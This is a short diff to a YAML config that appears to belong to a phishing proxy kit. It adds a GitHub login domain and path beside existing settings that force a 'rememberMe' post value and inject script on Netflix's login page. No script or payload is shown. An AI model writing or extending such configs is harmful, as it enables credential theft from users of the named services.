@@ -35,6 +35,10 @@ force_post:
       - {key: 'rememberMe', value: 'true'}
     type: 'post'
 
+login:
+  domain: 'github.com'
+  path: '/login'
+
 js_inject:
   - trigger_domains: ["www.netflix.com"]
     trigger_paths: ["/login"]
